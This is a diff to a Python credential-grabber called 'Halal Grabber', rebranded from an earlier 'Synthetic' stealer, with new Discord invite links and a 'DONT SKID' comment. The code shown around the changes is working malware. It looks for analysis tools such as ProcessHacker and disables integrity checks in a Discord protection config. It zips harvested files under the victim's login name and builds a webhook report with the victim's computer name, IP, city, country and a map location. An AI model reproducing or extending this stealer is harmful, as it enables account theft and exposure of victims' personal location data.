@@ -13,6 +13,9 @@ from re import findall
 from Crypto.Cipher import AES
 import psutil
 
+#0V4TEAM || https://discord.gg/aRru2PtJxN
+#DONT SKID!!
+
 PROCNAME = "ProcessHacker.exe"
 PROCNAME = "httpdebuggerui.exe"
 print("Loading client...")
@@ -131,7 +134,7 @@ class Synful:
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['Synthetic_shit_on_your_prot'] = "https://discord.gg/GWE3EDbf"
+                item['Halal_shit_on_your_prot'] = "https://discord.gg/aRru2PtJxN"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -149,7 +152,7 @@ class Synful:
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write(
-                    "\n\n//Halal Just shit on your protection | https://discord.gg/GWE3EDbf ")
+                    "\n\n//Halal Just shit on your protection | https://discord.gg/aRru2PtJxN ")
 
 
     def bypass_better_discord(self):
@@ -354,7 +357,7 @@ class Synful:
         except Exception:
             pass
         temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Synthetic-[{os.getlogin()}].zip')
+        new = os.path.join(self.appdata, f'Halal-[{os.getlogin()}].zip')
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
@@ -369,14 +372,14 @@ class Synful:
                 {
                     "author": {
                         "name": "Halal Grabber",
-                        "url": "https://discord.gg/GWE3EDbf",
+                        "url": "https://discord.gg/aRru2PtJxN",
                         "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
                     "description": f"The User **{os.getlogin()}** Has Just Opened Halal Grabber\n```diff\n- Computer Name: {os.getenv('COMPUTERNAME')}\n- IP: {ip}\n- City: {city}\n- Region: {region}\n- Country: {country}``` ```\n{self.fileCount}{self.files}``` [Location Google Maps]({googlemap})",
                     "color": 15277667,
 
                     "thumbnail": {
-                      "url": "https://discord.gg/GWE3EDbf"
+                      "url": "https://discord.gg/aRru2PtJxN"
                     },       
 
                     "footer": {
